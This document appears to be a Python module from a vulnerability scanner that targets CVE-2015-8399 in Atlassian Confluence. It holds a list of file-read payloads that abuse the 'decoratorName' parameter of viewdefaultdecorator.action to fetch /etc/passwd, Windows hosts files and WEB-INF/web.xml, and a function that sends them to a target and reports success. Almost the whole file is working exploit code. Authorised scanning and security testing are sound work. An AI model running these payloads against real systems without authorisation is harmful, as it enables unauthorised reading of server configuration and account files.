#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool import check

cve_2015_8399_payloads = [
    {'path': 'admin/viewdefaultdecorator.action?decoratorName=file:///etc/passwd'},
    {'path': 'admin/viewdefaultdecorator.action?decoratorName=file:///C:\Windows\System32\drivers\etc\hosts'},
    {'path': 'admin/viewdefaultdecorator.action?decoratorName=file:///C:/Windows/System32/drivers/etc/hosts'},
    {'path': 'admin/viewdefaultdecorator.action?decoratorName=/WEB-INF/web.xml'},
    {'path': 'viewdefaultdecorator.action?decoratorName=file:///etc/passwd'},
    {'path': 'viewdefaultdecorator.action?decoratorName=file:///C:\Windows\System32\drivers\etc\hosts'},
    {'path': 'viewdefaultdecorator.action?decoratorName=file:///C:/Windows/System32/drivers/etc/hosts'},
    {'path': 'viewdefaultdecorator.action?decoratorName=/WEB-INF/web.xml'},
    {'path': 'spaces/viewdefaultdecorator.action?decoratorName=file:///etc/passwd'},
    {'path': 'spaces/viewdefaultdecorator.action?decoratorName=file:///C:\Windows\System32\drivers\etc\hosts'},
    {'path': 'spaces/viewdefaultdecorator.action?decoratorName=file:///C:/Windows/System32/drivers/etc/hosts'},
    {'path': 'spaces/viewdefaultdecorator.action?decoratorName=/WEB-INF/web.xml'},
]

def cve_2015_8399_scan(clients):
    ''' Atlassian Confluence 5.8.17之前版本中存在安全, 
        该漏洞源于spaces/viewdefaultdecorator.action和admin/viewdefaultdecorator.action文件
        没有充分过滤'decoratorName'参数, 
        远程攻击者可利用该漏洞读取配置文件
    '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': 'AtlassianConfluence',
        'vul_type': 'FileRead',
        'vul_id': 'CVE-2015-8399',
    }
    
    headers = {
        'Referer': client.protocol_domain,
        'Origin': client.protocol_domain,
    }

    for payload in cve_2015_8399_payloads:
        path = payload['path']

        res = client.request(
            'get',
            path,
            headers=headers,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res is None:
            continue

        if (check.check_res_fileread(res.text)                          # * /etc/passwd or hosts
            or (('<?xml version="1.0" encoding="UTF-8"?>' in res.text)  # * web.xml
                and ('Confluence' in res.text))
        ):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
